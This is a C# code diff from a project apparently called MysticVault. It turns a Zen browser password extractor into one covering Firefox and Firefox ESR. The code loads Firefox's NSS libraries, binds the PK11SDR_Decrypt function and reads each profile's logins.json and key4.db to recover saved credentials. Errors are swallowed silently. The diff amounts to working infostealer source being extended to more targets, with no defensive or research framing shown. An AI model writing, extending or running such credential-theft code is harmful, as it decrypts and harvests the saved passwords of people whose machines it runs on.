@@ -6,7 +6,7 @@ using System.Text.Json;
 
 namespace MysticVault;
 
-public static class ZenExtractor
+public static class FirefoxExtractor
 {
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern bool SetDllDirectory(string? lpPathName);
@@ -20,16 +20,28 @@ public static class ZenExtractor
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool FreeLibrary(IntPtr hModule);
 
+    private static readonly (string Name, string InstallDir, string ProfilesDir)[] Variants =
+    {
+        ("Firefox", @"C:\Program Files\Mozilla Firefox", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Mozilla\Firefox\Profiles")),
+        ("Firefox ESR", @"C:\Program Files\Firefox ESR", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Mozilla\Firefox ESR\Profiles")),
+    };
+
     public static List<ExtractedCredential> ExtractAll()
     {
         var results = new List<ExtractedCredential>();
-        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-        string zenProfiles = Path.Combine(appData, "zen", "Profiles");
-        if (!Directory.Exists(zenProfiles)) return results;
-        string zenInstallDir = @"C:\Program Files\Zen Browser";
-        if (!Directory.Exists(zenInstallDir)) return results;
+        foreach (var variant in Variants)
+        {
+            if (!Directory.Exists(variant.InstallDir) || !Directory.Exists(variant.ProfilesDir)) continue;
+            try { results.AddRange(ExtractFromProfiles(variant.InstallDir, variant.ProfilesDir)); }
+            catch { }
+        }
+        return results;
+    }
 
-        SetDllDirectory(zenInstallDir);
+    private static List<ExtractedCredential> ExtractFromProfiles(string installDir, string profilesDir)
+    {
+        var results = new List<ExtractedCredential>();
+        SetDllDirectory(installDir);
         IntPtr mozglue = LoadLibrary("mozglue.dll");
         IntPtr nss3 = LoadLibrary("nss3.dll");
         if (nss3 == IntPtr.Zero)
@@ -51,7 +63,7 @@ public static class ZenExtractor
             var pk11SdrDecrypt = Marshal.GetDelegateForFunctionPointer<NssHelper.PK11SDR_Decrypt>(decryptPtr);
             var secItemFree = Marshal.GetDelegateForFunctionPointer<NssHelper.SECITEM_ZfreeItem>(freePtr);
 
-            foreach (var profileDir in Directory.GetDirectories(zenProfiles))
+            foreach (var profileDir in Directory.GetDirectories(profilesDir))
             {
                 string loginsPath = Path.Combine(profileDir, "logins.json");
                 string key4Path = Path.Combine(profileDir, "key4.db");
